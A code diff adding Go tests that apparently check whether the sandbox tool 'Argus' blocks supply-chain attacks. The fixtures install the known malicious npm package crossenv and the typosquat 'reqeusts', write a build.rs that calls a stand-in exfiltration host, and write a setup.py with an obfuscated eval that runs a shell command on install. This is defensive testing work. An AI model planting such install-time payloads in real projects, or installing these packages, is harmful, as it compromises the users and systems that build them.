@@ -634,3 +634,119 @@ func (m *mockInspector) Inspect(ctx context.Context, cmdArgs []string, workspace
 		},
 	}, nil
 }
+
+// TestSEC19_TyposquattingInterception verifies that Argus blocks known malicious
+// packages and typosquatted package installation commands (V-15).
+func TestSEC19_TyposquattingInterception(t *testing.T) {
+	tempDir := t.TempDir()
+
+	opts := sandbox.Options{
+		WorkspaceRoot:  tempDir,
+		Airgap:         true,
+		NonInteractive: true,
+		VetEnabled:     true,
+		VetStrict:      true,
+	}
+
+	eng, err := sandbox.NewEngine(opts)
+	if err != nil {
+		if errors.Is(err, sandbox.ErrBwrapNotFound) || errors.Is(err, sandbox.ErrUsernsDisabled) {
+			t.Skip("bwrap not found or unprivileged userns disabled; skipping on host")
+		}
+		t.Fatalf("SEC-19 FAILED: NewEngine failed: %v", err)
+	}
+
+	// 1. Known malicious npm package crossenv
+	code, err := eng.Execute(context.Background(), []string{"npm", "install", "crossenv"})
+	if err == nil {
+		t.Errorf("SEC-19 FAILED: Expected Argus to block crossenv installation")
+	}
+	if code != 1 {
+		t.Errorf("SEC-19 FAILED: Expected exit code 1, got %d", code)
+	}
+
+	// 2. PyPI typosquat reqeusts
+	code, err = eng.Execute(context.Background(), []string{"pip", "install", "reqeusts"})
+	if err == nil {
+		t.Errorf("SEC-19 FAILED: Expected Argus to block reqeusts typosquat")
+	}
+	if code != 1 {
+		t.Errorf("SEC-19 FAILED: Expected exit code 1, got %d", code)
+	}
+}
+
+// TestSEC20_RustBuildRsNetworkInterception verifies that Argus detects suspicious build.rs
+// network fetching or shell execution prior to compilation (V-16).
+func TestSEC20_RustBuildRsNetworkInterception(t *testing.T) {
+	tempDir := t.TempDir()
+
+	buildRsContent := `fn main() {
+    let _ = reqwest::blocking::get("https://malicious.exfiltrator.test");
+}
+`
+	if err := os.WriteFile(filepath.Join(tempDir, "build.rs"), []byte(buildRsContent), 0644); err != nil {
+		t.Fatalf("SEC-20 FAILED: Failed to write build.rs: %v", err)
+	}
+
+	opts := sandbox.Options{
+		WorkspaceRoot:  tempDir,
+		Airgap:         true,
+		NonInteractive: true,
+		VetEnabled:     true,
+		VetStrict:      true,
+	}
+
+	eng, err := sandbox.NewEngine(opts)
+	if err != nil {
+		if errors.Is(err, sandbox.ErrBwrapNotFound) || errors.Is(err, sandbox.ErrUsernsDisabled) {
+			t.Skip("bwrap not found or unprivileged userns disabled; skipping on host")
+		}
+		t.Fatalf("SEC-20 FAILED: NewEngine failed: %v", err)
+	}
+
+	code, err := eng.Execute(context.Background(), []string{"cargo", "build"})
+	if err == nil {
+		t.Errorf("SEC-20 FAILED: Expected Argus to block build.rs with network fetching")
+	}
+	if code != 1 {
+		t.Errorf("SEC-20 FAILED: Expected exit code 1, got %d", code)
+	}
+}
+
+// TestSEC21_SetupPyObfuscationInterception verifies that Argus detects obfuscated
+// execution payloads in setup.py (V-17).
+func TestSEC21_SetupPyObfuscationInterception(t *testing.T) {
+	tempDir := t.TempDir()
+
+	setupPyContent := `from setuptools import setup
+eval(compile(b"__import__('os').system('id')", "<string>", "exec"))
+setup(name="bad-pkg", version="0.1.0")
+`
+	if err := os.WriteFile(filepath.Join(tempDir, "setup.py"), []byte(setupPyContent), 0644); err != nil {
+		t.Fatalf("SEC-21 FAILED: Failed to write setup.py: %v", err)
+	}
+
+	opts := sandbox.Options{
+		WorkspaceRoot:  tempDir,
+		Airgap:         true,
+		NonInteractive: true,
+		VetEnabled:     true,
+		VetStrict:      true,
+	}
+
+	eng, err := sandbox.NewEngine(opts)
+	if err != nil {
+		if errors.Is(err, sandbox.ErrBwrapNotFound) || errors.Is(err, sandbox.ErrUsernsDisabled) {
+			t.Skip("bwrap not found or unprivileged userns disabled; skipping on host")
+		}
+		t.Fatalf("SEC-21 FAILED: NewEngine failed: %v", err)
+	}
+
+	code, err := eng.Execute(context.Background(), []string{"pip", "install", "."})
+	if err == nil {
+		t.Errorf("SEC-21 FAILED: Expected Argus to block obfuscated setup.py")
+	}
+	if code != 1 {
+		t.Errorf("SEC-21 FAILED: Expected exit code 1, got %d", code)
+	}
+}
